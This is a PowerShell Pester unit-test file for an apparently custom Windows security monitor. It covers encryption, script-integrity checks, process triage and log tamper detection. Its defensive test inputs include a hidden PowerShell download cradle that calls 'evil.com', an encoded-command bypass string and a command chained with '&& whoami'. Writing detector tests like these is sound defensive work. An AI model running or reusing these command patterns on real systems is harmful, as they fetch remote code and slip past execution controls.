# =====================================================================
# Security Sentinel Ultra v8.0 - Pester Unit Test Suite
# Tests: A1-A4, B1-B5, C1, C3, C4, DPAPI, Anti-Bypass, Phishing, Safe-Mode
# =====================================================================

$ScriptRoot = Split-Path -Parent $PSScriptRoot
$CoreDir = Join-Path $ScriptRoot "core"
$WatchdogScript = Join-Path $CoreDir "SentinelWatchdog.ps1"

Describe "Security Sentinel Ultra v8.0 Enterprise Security Controls" {
    BeforeAll {
        if (-not (Test-Path $WatchdogScript)) {
            throw "SentinelWatchdog.ps1 not found at $WatchdogScript"
        }
        $script:PesterStateDir = Join-Path $env:TEMP "SecuritySentinel_Pester_$PID"
        New-Item -ItemType Directory -Path $script:PesterStateDir -Force | Out-Null
        $env:SENTINEL_STATE_DIR = $script:PesterStateDir
        . $WatchdogScript -LibraryOnly
        $script:TrustAnchorHashes = Initialize-CodeIntegrityTrustAnchor
    }

    AfterAll {
        $env:SENTINEL_STATE_DIR = $null
        if ($script:PesterStateDir -and (Test-Path $script:PesterStateDir)) {
            Remove-Item -Path $script:PesterStateDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Context "1. Unified DPAPI Secret Vault & Static Entropy Rejection (A3)" {
        It "Should correctly encrypt and decrypt strings using DPAPI with CSPRNG entropy" {
            $secret = "https://discord.com/api/webhooks/test/sample_enterprise_webhook_url"
            $encrypted = Protect-DpapiString -PlainText $secret
            $encrypted | Should Not BeNullOrEmpty
            $encrypted | Should Not Be $secret

            $decrypted = Unprotect-DpapiString -CipherBase64 $encrypted
            $decrypted | Should Be $secret
        }

        It "Should return empty string when decrypting corrupted ciphertext" {
            $corrupted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("CorruptedData"))
            $decrypted = Unprotect-DpapiString -CipherBase64 $corrupted
            $decrypted | Should Be ""
        }

        It "Should strictly reject ciphertext encrypted with legacy static constant SENTINEL_ULTRA_V6_ENTROPY" {
            $staticEntropy = [System.Text.Encoding]::UTF8.GetBytes("SENTINEL_ULTRA_V6_ENTROPY_" + $env:COMPUTERNAME)
            $staticEnc = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("secret"), $staticEntropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
            $decrypted = Unprotect-DpapiString -CipherBase64 $staticEnc
            $decrypted | Should Be ""
        }
    }

    Context "2. Trust Anchor 10-Script Coverage & Dashboard Anti-Bypass (B1, B2)" {
        It "Should include all 10 core scripts in Trust Anchor hashes" {
            $script:AuthorizedCoreScripts.Count | Should Be 10
            $script:TrustAnchorHashes.ContainsKey("Start-Shield.ps1") | Should Be $true
            $script:TrustAnchorHashes.ContainsKey("Stop-Shield.ps1") | Should Be $true
            $script:TrustAnchorHashes.ContainsKey("SentinelTray.ps1") | Should Be $true
        }

        It "Should strictly reject encoded command payloads attempting to bypass by appending script name" {
            $fakeBypassCmd = "powershell.exe -enc VGVzdFBheWxvYWQ= SentinelDashboard.ps1"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $fakeBypassCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject commands without -File parameter" {
            $noFileCmd = "powershell.exe -ExecutionPolicy Bypass SentinelDashboard.ps1"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $noFileCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject commands containing chaining operators (&&, ;, |)" {
            $chainCmd = "powershell.exe -File `"C:\Safe\SentinelDashboard.ps1`" && whoami"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $chainCmd
            $isVerified | Should Be $false
        }
    }

    Context "3. Phishing Parent Process Detection & Macro Anomaly" {
        It "Should assign +50 risk score and CRITICAL alert when spawned by Office/Word macro" {
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
                                         -CommandLine "powershell.exe -w hidden (New-Object Net.WebClient).DownloadString('http://evil.com')" `
                                         -IsUnsigned $false -IsParentChildAnomaly $true -IsPhishingParent $true

            $triage.RiskScore | Should BeGreaterOrEqual 85
            $triage.Reasons | Should Contain "PhishingParentExploit(+50)"
        }
    }

    Context "4. Safe-Mode Zero-Trust Parent & AppData Spoofing Defense (A4)" {
        It "Should reject Safe-Mode pass via Inspect-SingleProcess when parent steam.exe is spoofed in Temp" {
            $childProc = [PSCustomObject]@{
                ProcessId       = 8882
                Name            = "worker.exe"
                ExecutablePath  = "C:\Users\victim\AppData\Local\Temp\worker.exe"
                CommandLine     = "worker.exe --task"
                ParentProcessId = 7772
                CreationDate    = "2026111502"
            }
            $spoofedMap = @{
                7772 = [PSCustomObject]@{
                    ProcessId      = 7772
                    Name           = "steam.exe"
                    ExecutablePath = "C:\Users\victim\AppData\Local\Temp\steam.exe"
                }
            }
            $res = Inspect-SingleProcess -p $childProc -procMap $spoofedMap
            $res.Action | Should Not Be "AllowedWorkGamingSafeMode"
        }

        It "Should reject Safe-Mode pass when unsigned parent is spoofed in AppData\Local\Programs (A4)" {
            $childProc = [PSCustomObject]@{
                ProcessId       = 8885
                Name            = "worker.exe"
                ExecutablePath  = "C:\Users\victim\AppData\Local\Temp\worker.exe"
                CommandLine     = "worker.exe --task"
                ParentProcessId = 7775
                CreationDate    = "2026111505"
            }
            $spoofedAppDataMap = @{
                7775 = [PSCustomObject]@{
                    ProcessId      = 7775
                    Name           = "node.exe"
                    ExecutablePath = "C:\Users\victim\AppData\Local\Programs\nodejs\node.exe"
                }
            }
            $res = Inspect-SingleProcess -p $childProc -procMap $spoofedAppDataMap
            $res.Action | Should Not Be "AllowedWorkGamingSafeMode"
        }

        It "Should grant Safe-Mode pass via Inspect-SingleProcess when parent is genuine in Program Files" {
            $childProc = [PSCustomObject]@{
                ProcessId       = 8883
                Name            = "worker.exe"
                ExecutablePath  = "C:\Users\victim\AppData\Local\Temp\worker.exe"
                CommandLine     = "worker.exe --task"
                ParentProcessId = 7773
                CreationDate    = "2026111503"
            }
            $legitMap = @{
                7773 = [PSCustomObject]@{
                    ProcessId      = 7773
                    Name           = "steam.exe"
                    ExecutablePath = "C:\Program Files (x86)\Steam\steam.exe"
                }
            }
            $res = Inspect-SingleProcess -p $childProc -procMap $legitMap
            $res.Action | Should Be "AllowedWorkGamingSafeMode"
        }
    }

    Context "5. Stop Token Security, Registry ACL & Tamper-Evident Logs (A1, A2, A3, C1, C3)" {
        It "Should reject stop token generated for a different PID or static entropy" {
            $valid = Test-AuthenticatedStopToken -ExpectedWatchdogPid "99999"
            $valid | Should Be $false
        }

        It "Should verify HMAC-SHA256 log chain and detect tampering (C1)" {
            Remove-Item $LogFile -Force -ErrorAction SilentlyContinue
            Write-Log "Pester HMAC Line 1" "INFO"
            Write-Log "Pester HMAC Line 2" "WARN"
            $ok = Test-SentinelLogIntegrity -Path $LogFile
            $ok.Valid | Should Be $true

            Add-Content -Path $LogFile -Value "[2026-11-15 00:00:00] [INFO] Tampered [HMAC:1234567890ABCDEF]" -Encoding UTF8
            $bad = Test-SentinelLogIntegrity -Path $LogFile
            $bad.Valid | Should Be $false
        }

        It "Should parse Security Event 4688 XML for short-lived processes (C3)" {
            $xml4688 = @"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>4688</EventID></System>
  <EventData>
    <Data Name="NewProcessId">0x1000</Data>
    <Data Name="NewProcessName">C:\Windows\System32\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -enc ZXZpbA==</Data>
    <Data Name="ProcessId">0x0500</Data>
  </EventData>
</Event>
"@
            $parsed = Parse-ProcessCreationEventXml -EventXmlString $xml4688
            $parsed.ProcessId | Should Be 4096
            $parsed.ParentProcessId | Should Be 1280
            $parsed.Name | Should Be "powershell.exe"
        }
    }
}
